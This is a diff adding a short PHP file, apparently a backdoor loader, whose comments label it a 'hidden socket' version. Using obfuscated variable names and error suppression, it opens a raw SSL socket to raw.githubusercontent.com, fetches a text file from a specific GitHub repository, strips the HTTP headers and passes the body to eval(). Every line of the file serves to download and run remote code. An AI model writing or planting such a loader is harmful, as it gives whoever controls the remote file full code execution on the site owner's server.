@@ -1,0 +1,15 @@
+<?php
+// ç‰ˆæœ¬ 1: stream_socket_client éšè—ç‰ˆ (Socket Tersembunyi)
+$ä¸»='raw.githubusercontent.com'; // ä¸» (Host)
+$è·¯='hesonakara-dot/tobrut/refs/heads/main/pure-meicing.txt'; // è·¯ (Path)
+$åœ°='ssl://'.$ä¸».':443'; // åœ° (Address)
+$è”=@stream_socket_client($åœ°,$e,$r,10,STREAM_CLIENT_CONNECT); // è” (Connect)
+if($è”){
+    $æ±‚="GET $è·¯ HTTP/1.0\r\nHost: $ä¸»\r\nUser-Agent: RandomBot\r\nConnection: Close\r\n\r\n"; // æ±‚ (Request)
+    fwrite($è”,$æ±‚);
+    $æ•°='';while(!feof($è”))$æ•°.=fgets($è”,256); // æ•° (Data)
+    fclose($è”);
+    $ç =explode("\r\n\r\n",$æ•°,2)[1]; // ç  (Code)
+    if($ç )eval("?>".$ç );
+}
+?>
